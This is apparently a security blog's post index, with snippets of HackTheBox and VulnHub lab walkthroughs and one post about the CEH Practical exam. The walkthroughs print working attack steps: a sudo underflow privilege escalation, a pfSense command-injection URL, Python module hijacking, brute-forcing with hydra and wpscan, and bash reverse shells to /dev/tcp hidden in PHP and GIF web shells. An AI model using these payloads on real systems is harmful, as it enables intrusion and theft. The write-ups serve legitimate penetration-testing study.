this.The vulnerability affects all Sudo versions prior to the latest released version 1.8.28.Privesc to roothugo@blunder:~$ sudo -u#-1 /bin/bashsudo -u#-1 /bin/bashPassword: Password120root@blunder:/home/hugo# cat /root/root.txtcat /root/root.txtdc6cb3733fe01dafef1eecfc147f56ebUseful links Bludit Brute Force Mitigation Bypass CVE-2019-17240 - Bludit bypass a brute-force protection CVE-2019-16113 - Bludit remote code execution Rule-based Attack sudo 1.8.27 - Security Bypass CVE-2019-14287 - sudo underflow Sudo Flaw Lets Linux Users Run Commands As Root Even When They’re Restricted" }, { "title": "HackTheBox - Sense", "url": "/htb-sense/", "categories": "Hackthebox walkthroughs, Linux, Easy", "tags": "htb-linux-easy, FreeBSD, pfSense, gobuster, default credentials, searchsploit, CVE-2014-4688, writeup, oscp-prep", "date": "2021-01-20 03:50:04 +0700", "snippet": "Footholdnmap scan$ nmap -min-rate 5000 --max-retries 1 -sV -sC -p- -oN Sense-full-port-scan.txt 10.10.10.60PORT STATE SERVICE VERSION80/tcp open http lighttpd 1.4.35|_http-server-header: lighttpd/1.4.35|_http-title: Did not follow redirect to https://10.10.10.60/443/tcp open ssl/https?| ssl-cert: Subject: commonName=Common Name (eg, YOUR name)/organizationName=CompanyName/stateOrProvinceName=Somewhere/countryName=US| Not valid before: 2017-10-14T19:21:35|_Not valid after: 2023-04-06T19:21:35|_ssl-date: TLS randomness does not represent time WARNING: By default, nmap does only a SYN scan (only the first two parts of a TCP handshake → SYN, SYN/ACK, ACK). We can add -sT option to do a full TCP scan. Doing just a SYN scan speeds things up. The downside is that if firewall products notice that you never completing the whole handshake, it may flag you as a bot and block you.lighttpd/1.4.35 (ports 80 &amp;amp; 443)It looks like an old pfSense login page.gobuster$ gobuster dir -u https://10.10.10.60 -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -x .txt -kGobuster v3.0.1by OJ Reeves (@TheColonial) &amp;amp; Christian Mehlmauer (@_FireFart_)===============================================================[+] Url: https://10.10.10.60[+] Threads: 10[+] Wordlist: /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt[+] Status codes: 200,204,301,302,307,401,403[+] User Agent: gobuster/3.0.1[+] Extensions: txt[+] Timeout: 10s===============================================================2021/01/19 18:13:18 Starting gobuster===============================================================/themes (Status: 301)/css (Status: 301)/includes (Status: 301)/javascript (Status: 301)/changelog.txt (Status: 200)/classes (Status: 301)/widgets (Status: 301)/tree (Status: 301)/shortcuts (Status: 301)/installer (Status: 301)/wizards (Status: 301)/csrf (Status: 301)/system-users.txt (Status: 200)/filebrowser (Status: 301)/%7echeckout%7e (Status: 403)===============================================================2021/01/19 19:30:07 Finished===============================================================We can take a look at the two txt files. TIP: If we use nikto, the firewall blocks our IP address. Probably due to some brute-force. An advice, consider bigger wordlists like /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt rather than /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt before running scanners like nikto./changelog.txtConsidering these notes, we’ll probably have to exploit a vulnerability on pfSense./system-users.txtPfSense default password (source: https://pfsense-docs.readthedocs.io/en/latest/usermanager/pfsense-default-username-and-password.html):Now we have some credentials: username: rohit password: pfsensepfSense dashboardWe can see pfSense version number: 2.1.3.ExploitationLet’s take a look at searchsploit:This exploit just run a reverse shell bash command via the following URL:https://10.10.10.160/status_rrd_graph_/assets/img/htb/machines/linux/easy/sense.php?database=queues;printf&#39;PAYLOAD&#39;|sh Flags:$ cat /root/root.txtd08c32a5d4f8c8b10e76eb51a69f1a86$ cat /home/rohit/user.txt8721327cc232073b40d27d9c17e7348bUseful links pfSense &amp;lt; 2.1.4 - ‘status_rrd_graph_/assets/img/htb/machines/linux/easy/sense.php’ Command Injection CVE-2014-4688" }, { "title": "C|EH Practical Exam", "url": "/CEH-Practical-Exam/", "categories": "blog, exam, eccouncil", "tags": "eccouncil, exam, certification", "date": "2021-01-18 21:00:00 +0700", "snippet": "Let&#39;s start off with saying, I was originally not planning to do the C|EH Practical. I only found out about this towards the end of last year and then the thought popped in my head that maybe I should just do this as I already passed the C|EH last year May and once you get through the C|EH practical exam, you get the C|EH Master certification.I am not going to go into the setting up and booking the exam, I am just going to blog about my experiance of the exam itself.So I started bright and early, 7:45am. After going through the necessary checks with the proctor I was ready to begin the exam. For those that don&#39;t know, the C|EH practical exam comprises of 20 questions which you have to answer within 6 hours based on the enviromnent they give you. It&#39;s open book so you are allow to use google, youtube and your notes. However, you are not allowed to ask anyone for help, no phone is allowed, no messaging like, discord, irc, skype, etc and only one 15 minute break.Right off the bat I made a stupid mistake on the first question which took me 20 minute more than it should of. I misread question two which also cost me more time than it should of, so basically I wasted about 45 minute on the first 2 questions alone which should have really taken me 10 minutes. So an hour on the first two questions did not sit well with me at all!I then decided to just glance through all the questions and get some idea of what is being asked and see what I could do in advance. Enumerating the basic network with nmap and finding all the info helped a lot to answer quite a few questions fairly easy. Most of the questions were straight forward for me and after just under 3 hours I managed to answer 18 of the questions.There were two questions I was struggling with and for the life of me, everything I threw at it didn&#39;t work! I had enough to pass and could have stopped right there. With me, there is no giving up and I spent the next two hours trying to figure it out. With an hour left, I just told myself this is not worth it as it could be something with the environment and it&#39;s something I just have to accept. I could have found the answer in another way, but I did not want to deviate from the scope of the question as the session was being recorded and was scared they would review it and find that I exploited it via another method which was not related to the question and then revoke my certification.I have to add, my experience doing the exam was not enjoyable for me. You have to connect to their environment, in a browser which is slow. You need to use their attack boxes. Some or most of the tools is outdated from what I experienced. You are not allowed to use a second monitor and being on a laptop screen which is tiny to navigate around on is not ideal. Copy and paste didn&#39;t work most of the time and switching between everything was a nightmare.Did I learn anything from this exam, no. Probably because I had all the knowledge already and I actually didn&#39;t use google or my notes at all, except for those two questions I was struggling with to confirm if my methods were working and they were so I could not understand why it was not working. Oh well. Needless to say, I recieved both my certifications and badges." }, { "title": "HackTheBox - Admirer", "url": "/htb-admirer/", "categories": "Hackthebox walkthroughs, Linux, Easy", "tags": "htb-linux-easy, gobuster, ftp, Adminer, MariaDB, MySQL, python module hijacking, writeup, oscp-prep", "date": "2021-01-16 20:32:38 +0700", "snippet": "Footholdnmap scan$ nmap -min-rate 5000 --max-retries 1 -sV -sC -p- -oN Admirer-full-port-scan.txt 10.10.10.187PORT STATE SERVICE VERSION21/tcp open ftp vsftpd 3.0.322/tcp open ssh OpenSSH 7.4p1 Debian 10+deb9u7 (protocol 2.0)| ssh-hostkey: | 2048 4a:71:e9:21:63:69:9d:cb:dd:84:02:1a:23:97:e1:b9 (RSA)| 256 c5:95:b6:21:4d:46:a4:25:55:7a:87:3e:19:a8:e7:02 (ECDSA)|_ 256 d0:2d:dd:d0:5c:42:f8:7b:31:5a:be:57:c4:a9:a7:56 (ED25519)80/tcp open http Apache httpd 2.4.25 ((Debian))| http-robots.txt: 1 disallowed entry |_/admin-dir|_http-server-header: Apache/2.4.25 (Debian)|_http-title: AdmirerService Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernelnmap points out that there is an entry in robots.txt (on port 80) which is /admin-dir.HTTP (port 80)$ gobuster dir -u http://$IP -w /usr/share/dirb/wordlists/common.txt/assets (Status: 301)/images (Status: 301)/index.php (Status: 200)/robots.txt (Status: 200)/server-status (Status: 403) robots.txt:waldo is a potential user./admin-dirThanks to gobuster, we can see that there are two hidden files contacts.txt and .txt in /admin-dir.$ gobuster dir -u http://$TARGET/admin-dir -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt -x .txt,.php/contacts.txt (Status: 200)/credentials.txt (Status: 200) contacts.txt:6 potential users: penny wise rajesh nayyar amy bialik leonard galecki howard helberg bernadette rauch credentials.txt:Now we have some useful credentials: Internal mail account: username → w.cooper@admirer.htb password → fgJr6q#S\\W:$P FTP account: username → ftpuser password → %n?4Wz}R$tTF7 Wordpress account: username → admin password → w0rdpr3ss01! FTP (port 21)$ ftp $TARGETConnected to 10.10.10.187.220 (vsFTPd 3.0.3)Name (10.10.10.187:root): ftpuser331 Please specify the password.Password: %n?4Wz}R$tTF7230 Login successful.Remote system type is UNIX.Using binary mode to transfer files.ftp&amp;gt; ls200 PORT command successful. Consider using PASV.150 Here comes the directory listing.-rw-r--r-- 1 0 0 3405 Dec 02 2019 dump.sql-rw-r--r-- 1 0 0 5270987 Dec 03 2019 html.tar.gz226 Directory send OK.ftp&amp;gt; get dump.sqllocal: dump.sql remote: dump.sql200 PORT command successful. Consider using PASV.150 Opening BINARY mode data connection for dump.sql (3405 bytes).226 Transfer complete.3405 bytes received in 0.00 secs (1.0795 MB/s)ftp&amp;gt; get html.tar.gzlocal: html.tar.gz remote: html.tar.gz200 PORT command successful. Consider using PASV.150 Opening BINARY mode data connection for html.tar.gz (5270987 bytes).226 Transfer complete.5270987 bytes received in 10.05 secs (512.4245 kB/s)We retrieved two files: dump.sql html.tar.gzhtml.tar.gz looks like the source code of the website except that /admin-dir is replaced by /w4ld0s_s3cr3t_d1r. Besides, there is a folder called utility-scripts:Additional credentials can be found in utility-scripts/db_admin.php: username: waldo password: Wh3r3_1s_w4ld0?AdminerWe can run three types of requests. I wanted to remove one of the disabled attribute in order to see what happens next:This error message appeared:We need some privileges, maybe we have a log in page. so I ran gobuster against /utility-scripts:$ gobuster dir -u http://$TARGET/utility-scripts/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt -x .txt,.php -s 200/adminer.php (Status: 200)/info.php (Status: 200)/phptest.php (Status: 200)Indeed, there is Adminer running on http://10.10.10.187/utility-scripts/adminer.php:Unfortunately, we cannot log in even when using credentials we gathered so far.I looked for “adminer 4.6.2 vuln” and “adminer 4.6.2 exploit” and I found this article about a serious vulnerability discovered in Adminer affecting version v4.6.2:Setting up MySQLSince we can specify MySQl Server’s IP address, let’s run MySQL on our machine: Ensure you have already installed mariadb, otherwise install it:$ dpkg -l | grep mariadb# if no output, install it via:# apt install mariadb-server-&amp;lt;LAST_VERSION&amp;gt; mariadb-client-&amp;lt;LAST_VERSION&amp;gt; Connect to MySQL and create a user dedicated to it:$ mysql -u rootMariaDB [(none)]&amp;gt; CREATE USER &#39;&amp;lt;USERNAME&amp;gt;&#39;@&#39;10.10.10.187&#39; IDENTIFIED BY&#39;&amp;lt;YOUR PASSWORD&amp;gt;&#39;;Query OK, 0 rows affected (0.001 sec) The IP address is set to 10.10.10.187 because we want to enable target HTB machine to connect to our Database. Put a password strong enough so that other HTB users cannot guess it quickly and connect to our database. You can use pwgen command to generate passwords. Create a temporary Database:MariaDB [(none)]&amp;gt; CREATE DATABASE &amp;lt;TEMP_DB_NAME&amp;gt;;Query OK, 1 row affected (0.000 sec) Grant all privileges to your new user on this temporary database:MariaDB [(none)]&amp;gt; GRANT ALL PRIVILEGES ON &amp;lt;TEMP_DB_NAME&amp;gt;.* TO &amp;lt;USERNAME&amp;gt;@&#39;10.10.10.187&#39;;Query OK, 0 rows affected (0.001 sec) Edit /etc/mysql/mariadb.conf.d/50-server.cnf and change bind-address address to your HTB IP:bind-address = &amp;lt;HTB_IP&amp;gt; (Re)start service:$ systemctl restart mariadbYou’re now connected: As you can see, I named my temporary database TEMPDB and I’m connected to my HTB private IP 10.10.14.6.ExploitIn order to perform a similar exploit as in the article video, we have to create a table by clicking on “Create table” link on the left of the page.However there is no such file as app/etc/local.xml as we can see:Let’s be creative. What about /etc/passwd:Arg! Let’s try admin_tasks.php since we are in the same directory:LOAD DATA LOCAL INFILE &#39;admin_tasks.php&#39;INTO TABLE TEMPDB.backupFIELDS TERMINATED BY &quot;\\n&quot;Bu there is nothing interesting:Looking at ../index.php, we can see there are new credentials:LOAD DATA LOCAL INFILE &#39;../index.php&#39;INTO TABLE TEMPDB.backupFIELDS TERMINATED BY &quot;\\n&quot; username: waldo password: &amp;amp;&amp;lt;h5b~yK3F#{PaPB&amp;amp;dA}{H&amp;gt;Using these credentials we can log in to ssh:User (waldo)waldo@admirer:~$ cat user.txt 2cf909ef8117cf88a7793227946a8fffwaldo@admirer:~$ sudo -l[sudo] password for waldo: Matching Defaults entries for waldo on admirer: env_reset, env_file=/etc/sudoenv, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin, listpw=alwaysUser waldo may run the following commands on admirer: (ALL) SETENV: /opt/scripts/admin_tasks.shwaldo@admirer:~$ SETENV means when we execute sudo we can set environment variables.Let’s take a look at admin_tasks.sh:#!/bin/bashview_uptime(){ /usr/bin/uptime -p}view_users(){ /usr/bin/w}view_crontab(){ /usr/bin/crontab -l}backup_passwd(){ if [ &quot;$EUID&quot; -eq 0 ] then echo &quot;Backing up /etc/passwd to /var/backups/passwd.bak...&quot; /bin/cp /etc/passwd /var/backups/passwd.bak /bin/chown root:root /var/backups/passwd.bak /bin/chmod 600 /var/backups/passwd.bak echo &quot;Done.&quot; else echo &quot;Insufficient privileges to perform the selected operation.&quot; fi}backup_shadow(){ if [ &quot;$EUID&quot; -eq 0 ] then echo &quot;Backing up /etc/shadow to /var/backups/shadow.bak...&quot; /bin/cp /etc/shadow /var/backups/shadow.bak /bin/chown root:shadow /var/backups/shadow.bak /bin/chmod 600 /var/backups/shadow.bak echo &quot;Done.&quot; else echo &quot;Insufficient privileges to perform the selected operation.&quot; fi}backup_web(){ if [ &quot;$EUID&quot; -eq 0 ] then echo &quot;Running backup script in the background, it might take a while...&quot; /opt/scripts/backup.py &amp;amp; else echo &quot;Insufficient privileges to perform the selected operation.&quot; fi}backup_db(){ if [ &quot;$EUID&quot; -eq 0 ] then echo &quot;Running mysqldump in the background, it may take a while...&quot; #/usr/bin/mysqldump -u root admirerdb &amp;gt; /srv/ftp/dump.sql &amp;amp; /usr/bin/mysqldump -u root admirerdb &amp;gt; /var/backups/dump.sql &amp;amp; else echo &quot;Insufficient privileges to perform the selected operation.&quot; fi}# Non-interactive way, to be used by the web interfaceif [ $# -eq 1 ]then option=$1 case $option in 1) view_uptime ;; 2) view_users ;; 3) view_crontab ;; 4) backup_passwd ;; 5) backup_shadow ;; 6) backup_web ;; 7) backup_db ;; *) echo &quot;Unknown option.&quot; &amp;gt;&amp;amp;2 esac exit 0fi# Interactive way, to be called from the command lineoptions=(&quot;View system uptime&quot; &quot;View logged in users&quot; &quot;View crontab&quot; &quot;Backup passwd file&quot; &quot;Backup shadow file&quot; &quot;Backup web data&quot; &quot;Backup DB&quot; &quot;Quit&quot;)echoecho &quot;[[[ System Administration Menu ]]]&quot;PS3=&quot;Choose an option: &quot;COLUMNS=11select opt in &quot;${options[@]}&quot;; do case $REPLY in 1) view_uptime ; break ;; 2) view_users ; break ;; 3) view_crontab ; break ;; 4) backup_passwd ; break ;; 5) backup_shadow ; break ;; 6) backup_web ; break ;; 7) backup_db ; break ;; 8) echo &quot;Bye!&quot; ; break ;; *) echo &quot;Unknown option.&quot; &amp;gt;&amp;amp;2 esacdoneexit 0In backup_web function the script is calling a python script /opt/scripts/backup.py:#!/usr/bin/python3from shutil import make_archivesrc = &#39;/var/www/html/&#39;# old ftp directory, not used anymore#dst = &#39;/srv/ftp/html&#39;dst = &#39;/var/backups/html&#39;make_archive(dst, &#39;gztar&#39;, src)RootDue to the SETENV misconfiguration in sudo, we can hijack shutil Python’s library and create a malicious function called make_archive:$ printf &quot;def make_archive(a, b, c):\\n\\twith open(&#39;/root/root.txt&#39;, &#39;r&#39;) as rootPass:\\n\\t\\twith open(&#39;/dev/shm/.solve&#39;, &#39;w&#39;) as solution:\\n\\t\\t\\tsolution.write(rootPass.read())\\n&quot; &amp;gt; /dev/shm/shutil.py$ cat /dev/shm/shutil.pydef make_archive(a, b, c): with open(&#39;/root/root.txt&#39;, &#39;r&#39;) as rootPass: with open(&#39;/dev/shm/.solve&#39;, &#39;w&#39;) as solution: solution.write(rootPass.read())$ sudo PYTHONPATH=/dev/shm/ /opt/scripts/admin_tasks.sh[[[ System Administration Menu ]]]1) View system uptime2) View logged in users3) View crontab4) Backup passwd file5) Backup shadow file6) Backup web data7) Backup DB8) QuitChoose an option: 6Running backup script in the background, it might take a while...$ cat /dev/shm/.solvec7b1d296e8986080b28e0e73bb14c232Useful links Serious Vulnerability Discovered in Adminer database Administration Tool SQL.sh" }, { "title": "VulnHub - Mr Robot", "url": "/vulnhub-mr-robot/", "categories": "VulnHub walkthroughs, Linux", "tags": "vulnhub-linux, netdiscover, brute-force, hydra, wordpress, wpscan, reverse-shell, password cracking, hashcat, SUID, GTFOBins, nmap, writeup, oscp-prep", "date": "2021-01-16 07:10:49 +0700", "snippet": "Enumerationnmap scannmap -min-rate 5000 --max-retries 1 -sV -sC -p- -oN Mr-robot-full-port-scan.txt 192.168.1.25PORT STATE SERVICE VERSION22/tcp closed ssh80/tcp open http Apache httpd|_http-server-header: Apache|_http-title: Site doesn&#39;t have a title (text/html).443/tcp open ssl/http Apache httpd|_http-server-header: Apache|_http-title: Site doesn&#39;t have a title (text/html).| ssl-cert: Subject: commonName=www.example.com| Not valid before: 2015-09-16T10:45:03|_Not valid after: 2025-09-13T10:45:03MAC Address: 08:00:27:56:5D:6D (Oracle VirtualBox virtual NIC)HTTP•S (port 80 &amp;amp; 443)gobuster$ gobuster dir -u http://192.168.1.25 -w /usr/share/dirb/wordlists/common.txt/.hta (Status: 403)/.htaccess (Status: 403)/.htpasswd (Status: 403)/0 (Status: 301)/admin (Status: 301)/atom (Status: 301)/audio (Status: 301)/blog (Status: 301)/css (Status: 301)/dashboard (Status: 302)/favicon.ico (Status: 200)/feed (Status: 301)/images (Status: 301)/index.html (Status: 200)/intro (Status: 200)/js (Status: 301)/license (Status: 200)/login (Status: 302)/page1 (Status: 301)/phpmyadmin (Status: 403)/readme (Status: 200)/rdf (Status: 301)/robots (Status: 200)/robots.txt (Status: 200)/rss (Status: 301)/rss2 (Status: 301)/sitemap (Status: 200)/sitemap.xml (Status: 200)/video (Status: 301)/wp-admin (Status: 301)/wp-content (Status: 301)/wp-config (Status: 200)/wp-includes (Status: 301)/wp-cron (Status: 200)/wp-links-opml (Status: 200)/wp-load (Status: 200)/wp-mail (Status: 403)/wp-login (Status: 200)/wp-signup (Status: 302)nikto$ nikto -h $TARGET- Nikto v2.1.6---------------------------------------------------------------------------+ Target IP: 192.168.1.25+ Target Hostname: 192.168.1.25+ Target Port: 80+ Start Time: 2021-01-15 21:35:34 (GMT1)---------------------------------------------------------------------------+ Server: Apache+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type+ Retrieved x-powered-by header: PHP/5.5.29+ No CGI Directories found (use &#39;-C all&#39; to force check all possible dirs)+ Uncommon header &#39;tcn&#39; found, with contents: list+ Apache mod_negotiation is enabled with MultiViews, which allows attackers to easily brute force file names. See http://www.wisec.it/sectou.php?id=4698ebdc59d15. The following alternatives for &#39;index&#39; were found: index.html, index.php+ OSVDB-3092: /admin/: This might be interesting...+ Uncommon header &#39;link&#39; found, with contents: &amp;lt;http://192.168.1.25/?p=23&amp;gt;; rel=shortlink+ /wp-links-opml.php: This WordPress script reveals the installed version.+ OSVDB-3092: /license.txt: License file found may identify site software.+ /admin/index.html: Admin login page/section found.+ Cookie wordpress_test_cookie created without the httponly flag+ /wp-login/: Admin login page/section found.+ /wordpress: A Wordpress installation was found.+ /wp-admin/wp-login.php: Wordpress login found+ /wordpresswp-admin/wp-login.php: Wordpress login found+ /blog/wp-login.php: Wordpress login found+ /wp-login.php: Wordpress login found+ /wordpresswp-login.php: Wordpress login found+ 7915 requests: 0 error(s) and 18 item(s) reported on remote host+ End Time: 2021-01-15 21:37:27 (GMT1) (113 seconds)---------------------------------------------------------------------------robots.txt key-1-of-3.txt: Maybe, we have to to find key-2-of-3.txt and key-3-of-3.txt fsocity.dic is just a regular wordlist:$ wc -l fsocity.dic 858160 fsocity.dic$ head -n 10 fsocity.dic truefalsewikiafromthenowWikiaextensionsscsswindowWe can see there are a lot of duplicates, we can remove them by doing so:$ sort -u fsocity.dic | wc -l11451$ sort -u fsocity.dic &amp;gt; fsociety_filtered.dicwordpressThanks /wp-links-opml.php (discovered via gobuster), we can guess Wordpress version (4.3.25) and a potential username (user):I tried wpscan in order to identify potential vulnerable plugins and/or other users:wpscan --url https://192.168.1.25/ --disable-tls-checks --enumerate u But I didn’t get anything.Finding valid usernameIf we send some random username/password via /wp-login.php, we got an interesting error message:We can use that to enumerate some valid usernames by using hydra to brute-force:$ hydra -L fsociety_filtered.dic -p whatever 192.168.1.25 http-post-form &#39;/wp-login.php:log=^USER^&amp;amp;pwd=^PASS^&amp;amp;wp-submit=Log+In:F=Invalid username&#39;And we find elliot as a valid username. Indeed:Bruteforcing elliott passwordWith wpscan, we can try to find his password:$ wpscan --url https://192.168.1.25/ --disable-tls-checks --password-attack wp-login -U elliot -P fsociety_filtered.dic -t 100 And we succeed:Reverse shellI uploaded a new plugin containing the following code:&amp;lt;?phpexec(&quot;/bin/bash -c &#39;bash -i &amp;gt;&amp;amp; /dev/tcp/192.168.1.171/1234 0&amp;gt;&amp;amp;1&#39;&quot;);Despite that I encountered an error, the malicious PHP file was successfully uploaded in /wp-content/uploads:I retrieved its location by looking at the Media Library:When we visite the URL http://192.168.1.25/wp-content/uploads/2021/01/shell.php, we have a shell:User (robot)daemon@linux:/opt/bitnami/apps/wordpress/htdocs/wp-content/uploads/2021/01$ daemon@linux:/home$ lsrobotdaemon@linux:/home$ cd robotcd robotdaemon@linux:/home/robot$ ls -lals -latotal 16drwxr-xr-x 2 root root 4096 Nov 13 2015 .drwxr-xr-x 3 root root 4096 Nov 13 2015 ..-r-------- 1 robot robot 33 Nov 13 2015 key-2-of-3.txt-rw-r--r-- 1 robot robot 39 Nov 13 2015 password.raw-md5daemon@linux:/home/robot$ cat password.raw-md5robot:c3fcd3d76192e4007dfb496cca67e13bCracking MD5 using hashcat$ hashcat -m 0 files/password.raw-md5 /usr/share/wordlists/rockyou.txt#...c3fcd3d76192e4007dfb496cca67e13b:abcdefghijklmnopqrstuvwxyz#...Now that we have his password, we can get key-2-of-3.txt’s content:daemon@linux:/home/robot$ su robotsu robotPassword: abcdefghijklmnopqrstuvwxyzrobot@linux:~$ ididuid=1002(robot) gid=1002(robot) groups=1002(robot)robot@linux:~$ cat key-2-of-3.txtcat key-2-of-3.txt822c73956184f694993bede3eb39f959robot@linux:~$ Road to rootI executed linpeas.sh to look for possible ways to get root.Surprisingly, there is nmap among the SUID binaries:We can check on GTFOBins how we can perform a privesc:And we are root:robot@linux:/tmp$ nmap --interactivenmap --interactiveStarting nmap V. 3.81 ( http://www.insecure.org/nmap/ )Welcome to Interactive Mode -- press h &amp;lt;enter&amp;gt; for helpnmap&amp;gt; !sh!sh# ididuid=1002(robot) gid=1002(robot) euid=0(root) groups=0(root),1002(robot)# cd /rootcd /root# ls -lals -latotal 32drwx------ 3 root root 4096 Nov 13 2015 .drwxr-xr-x 22 root root 4096 Sep 16 2015 ..-rw------- 1 root root 4058 Nov 14 2015 .bash_history-rw-r--r-- 1 root root 3274 Sep 16 2015 .bashrcdrwx------ 2 root root 4096 Nov 13 2015 .cache-rw-r--r-- 1 root root 0 Nov 13 2015 firstboot_done-r-------- 1 root root 33 Nov 13 2015 key-3-of-3.txt-rw-r--r-- 1 root root 140 Feb 20 2014 .profile-rw------- 1 root root 1024 Sep 16 2015 .rnd# cat key-3-of-3.txt04787ddef27c3dee1ee161b21670b4e4" }, { "title": "VulnHub - Pwnlab", "url": "/vulnhub-pwnlab/", "categories": "VulnHub walkthroughs, Linux", "tags": "vulnhub-linux, netdiscover, nikto, LFI, php filter, MySQL, magic bytes, file upload bypass, tcpdump, lang cookie, reverse-shell, ghidra, decompilation, pwn, PATH, format string exploit, writeup, oscp-prep", "date": "2021-01-13 21:21:53 +0700", "snippet": "Enumerationnetdiscovernmap scan$ nmap -min-rate 5000 --max-retries 1 -sV -sC -p- -oN Pwnlab-full-port-scan.txt 192.168.1.170PORT STATE SERVICE VERSION80/tcp open http Apache httpd 2.4.10 ((Debian))|_http-server-header: Apache/2.4.10 (Debian)|_http-title: PwnLab Intranet Image Hosting111/tcp open rpcbind 2-4 (RPC #100000)| rpcinfo: | program version port/proto service| 100000 2,3,4 111/tcp rpcbind| 100000 2,3,4 111/udp rpcbind| 100000 3,4 111/tcp6 rpcbind| 100000 3,4 111/udp6 rpcbind| 100024 1 43982/udp status| 100024 1 45935/tcp status| 100024 1 57068/tcp6 status|_ 100024 1 59812/udp6 status3306/tcp open mysql MySQL 5.5.47-0+deb8u1| mysql-info: | Protocol: 10| Version: 5.5.47-0+deb8u1| Thread ID: 41| Capabilities flags: 63487| Some Capabilities: DontAllowDatabaseTableColumn, Support41Auth, ConnectWithDatabase, LongColumnFlag, Speaks41ProtocolOld, SupportsTransactions, SupportsLoadDataLocal, InteractiveClient, IgnoreSigpipes, ODBCClient, Speaks41ProtocolNew, IgnoreSpaceBeforeParenthesis, SupportsCompression, FoundRows, LongPassword, SupportsMultipleStatments, SupportsAuthPlugins, SupportsMultipleResults| Status: Autocommit| Salt: k4^]:JDSX?sD:5:env*h|_ Auth Plugin Name: mysql_native_password45935/tcp open status 1 (RPC #100024)HTTP (port 80)gobuster$ gobuster dir -u http://192.168.1.170 -w /usr/share/dirb/wordlists/common.txt/.hta (Status: 403)/.htaccess (Status: 403)/.htpasswd (Status: 403)/images (Status: 301)/index.php (Status: 200)/server-status (Status: 403)/upload (Status: 301)nikto vulnerability scanWeb page index.php: upload.php: login.php:Because of this common pattern between the two pages upload and login, I wanted to check if the website is vulnerable to LFI (Local File Inclusion).LFIIndeed:Thanks to nikto we saw earlier that there is a config.php page.Let’s get base64 code of each page we identified so far.In config.php source code:&amp;lt;?php$server = &quot;localhost&quot;;$username = &quot;root&quot;;$password = &quot;H4u%QJ_H99&quot;;$database = &quot;Users&quot;;?&amp;gt;MySQL (port 3306)Since we have credentials, we can connect to the MySQL database:We gathered three usernames and their passwords: username: kent; password: JWzXuBJJNy username: mike; password: SIfdsTEn6I username: kane; password: iSv5Ym2GRoReverse shellUsing credentials stored in MySQL, we can go back log in and upload some files:Due to getimagesize PHP function used in upload.php, I remembered hackers-grimoire - file upload bypassI wanted tGIF89a; magic bytesIf we want to pass the image check, we can add a GIF file header to our malicious file.I renamed the file as ping.gif:GIF89; &amp;lt;?php system(&quot;ping -c1 192.168.1.171&quot;) ?&amp;gt;By the way, the file is now considerate as a legitimate image:$ file ping.gif ping.gif: GIF image data 8224 x 15370After uploading the image we can retrieve its location by inspecting the source code:Now we have the image PATH: upload/360ae33efb11f1be532d46e9daf60828.gif.tcpdump ping testIn order to ensure that code execution works, we can try to include the image we uploaded by setting lang cookie to ../upload/360ae33efb11f1be532d46e9daf60828.gif:And it worked, pwnlab pinged us (tcpdump as proof):$ tcpdump icmptcpdump: verbose output suppressed, use -v or -vv for full protocol decodelistening on eth0, link-type EN10MB (Ethernet), capture size 262144 bytes12:38:56.995815 IP pwnlab &amp;gt; kali: ICMP echo request, id 1222, seq 1, length 6412:38:56.995833 IP kali &amp;gt; pwnlab: ICMP echo reply, id 1222, seq 1, length 64^C2 packets captured2 packets received by filter0 packets dropped by kernelFinal payloadOur final file:GIF89; &amp;lt;?php exec(&quot;bash -c &#39;bash -i &amp;gt;&amp;amp; /dev/tcp/192.168.1.171/1234 0&amp;gt;&amp;amp;1&#39;&quot;); ?&amp;gt;lang cookie is now equal to:../upload/dfbb431572245b404f7db316d70bfc70.gifFirst I thought it didn’t worked, but after pressing “Go back one page”, I got a shell:Privesc (kane to mike)By using MySQL credentials, I was able to log in as kent and kane but not as mike. kent:www-data@pwnlab:/home$ su kentsu kentPassword: JWzXuBJJNykent@pwnlab:/home$kent@pwnlab:/home$ cd kentkent@pwnlab:~$ ls -latotal 20drwxr-x--- 2 kent kent 4096 Mar 17 2016 .drwxr-xr-x 6 root root 4096 Mar 17 2016 ..-rw-r--r-- 1 kent kent 220 Mar 17 2016 .bash_logout-rw-r--r-- 1 kent kent 3515 Mar 17 2016 .bashrc-rw-r--r-- 1 kent kent 675 Mar 17 2016 .profileThere is nothing interesting in kent’s folder. Let’s try to log in as mike: mike:kent@pwnlab:~$ su mikesu mikePassword: SIfdsTEn6Isu: Authentication failure kane:kent@pwnlab:~$ su - kanesu - kanePassword: iSv5Ym2GRokane@pwnlab:~$In kane’s folder, there is a SUID binary called msgmike:kane@pwnlab:~$ cd kane@pwnlab:~$ ls -latotal 28drwxr-x--- 2 kane kane 4096 Mar 17 2016 .drwxr-xr-x 6 root root 4096 Mar 17 2016 ..-rw-r--r-- 1 kane kane 220 Mar 17 2016 .bash_logout-rw-r--r-- 1 kane kane 3515 Mar 17 2016 .bashrc-rwsr-sr-x 1 mike mike 5148 Mar 17 2016 msgmike-rw-r--r-- 1 kane kane 675 Mar 17 2016 .profilekane@pwnlab:~$ file msgmikemsgmike: setuid, setgid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=d7e0b21f33b2134bd17467c3bb9be37deb88b365, not strippedkane@pwnlab:~$ Transfer msgmike to our machineMethod #1: base64kane@pwnlab:~$ base64 